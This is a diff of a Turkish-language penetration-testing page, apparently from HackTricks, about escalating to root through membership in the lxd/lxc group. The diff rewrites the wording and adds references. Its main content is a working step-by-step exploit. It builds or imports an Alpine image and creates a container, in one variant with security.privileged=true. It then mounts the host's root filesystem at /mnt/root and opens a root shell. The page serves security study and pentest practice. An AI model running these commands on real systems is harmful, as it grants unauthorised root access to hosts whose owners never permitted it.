@@ -1,18 +1,16 @@
 # lxd/lxc Group - Privilege escalation
 
-{{#include ../../../banners/hacktricks-training.md}}
-
-_**lxd**_ **veya** _**lxc** grubuna_ dahilseniz root olabilirsiniz
+Host'un LXD management group'una (normalde _**lxd**_) üye olmak, daemon üzerinde tam kontrol sağlayarak root'a ulaşma yolu sunabilir.<sup>[[1]](#references)</sup>
 
 ## İnternet olmadan Exploiting
 
 ### Method 1
 
-lxd ile kullanmak üzere güvenilir bir repository'den bir alpine image indirebilirsiniz.
-Canonical, sitelerinde günlük build'ler yayımlar: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
-En yeni build'den hem **lxd.tar.xz** hem de **rootfs.squashfs** dosyalarını alın. (Directory adı tarihtir).
+LXD ile kullanmak üzere güvenilir bir repository'den Alpine image indirebilirsiniz.  
+Canonical'ın LXD image server'ı günlük build'ler yayımlar: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
+En yeni build'den (directory adı tarihtir) yalnızca **lxd.tar.xz** ve **rootfs.squashfs** dosyalarını indirin.<sup>[[8]](#references)</sup>
 
-Alternativelly bu distro builder'ı makinenize kurabilirsiniz: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (github talimatlarını izleyin):
+Alternatif olarak, [project instructions](https://github.com/lxc/distrobuilder) izleyerek makinenize distrobuilder kurabilirsiniz.<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
 ```bash
 # Install requirements
 sudo apt update
@@ -35,7 +33,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-**incus.tar.xz** (**lxd.tar.xz** if you downloaded from Canonical repository) ve **rootfs.squashfs** dosyalarını upload edin, image'ı repo'ya ekleyin ve bir container oluşturun:
+**incus.tar.xz** (**lxd.tar.xz**, Canonical image server'dan indirdiyseniz) ve **rootfs.squashfs** dosyalarını yükleyin, ardından image'ı içe aktarın ve bir container oluşturun.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -51,18 +49,18 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> _**Error: No storage pool found. Please create a new storage pool**_ hatasını bulursanız\
-> **`lxd init`** komutunu çalıştırın ve tüm seçenekleri varsayılan olarak ayarlayın. Ardından önceki komut bloğunu **tekrarlayın**
+> Bu hatayı bulursanız _**Hata: Hiçbir depolama havuzu bulunamadı. Lütfen yeni bir depolama havuzu oluşturun**_\
+> **`lxd init`** komutunu çalıştırın, varsayılan bir depolama havuzu kurun, ardından önceki komut grubunu **tekrarlayın**.<sup>[[2]](#references)</sup>
 
-Son olarak container'ı çalıştırabilir ve root elde edebilirsiniz:
+Son olarak container'ı başlatın ve host dosya sistemi üzerinde bir root shell açın:<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-### Yöntem 2
+### Method 2
 
-Bir Alpine image oluşturun ve `security.privileged=true` flag'ini kullanarak başlatın; böylece container, host filesystem ile root olarak etkileşime girmeye zorlanır.
+Bir Alpine image oluşturun ve `security.privileged=true` flag'iyle başlatın; bu, container root'unu host root'a eşler ve ardından `/` mount edilerek host filesystem'ı container içinde görünür hâle gelir.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -82,4 +80,15 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 ```
+## References
+
+- [1] [LXD için güvenlik nasıl güçlendirilir](https://canonical.com/lxd/docs/latest/howto/security_harden/)
+- [2] [LXD container'ları ve virtual machine'ler](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
+- [3] [Image'lar nasıl kopyalanır ve içe aktarılır](https://canonical.com/lxd/docs/latest/howto/images_copy/)
+- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
+- [5] [distrobuilder ile image'lar nasıl oluşturulur](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
+- [6] [Alpine image tanımı](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
+- [7] [lxd-alpine-builder build script'i](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
+- [8] [LXD image server'ı](https://images.lxd.canonical.com/)
+- [9] [Tür: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
 {{#include ../../../banners/hacktricks-training.md}}
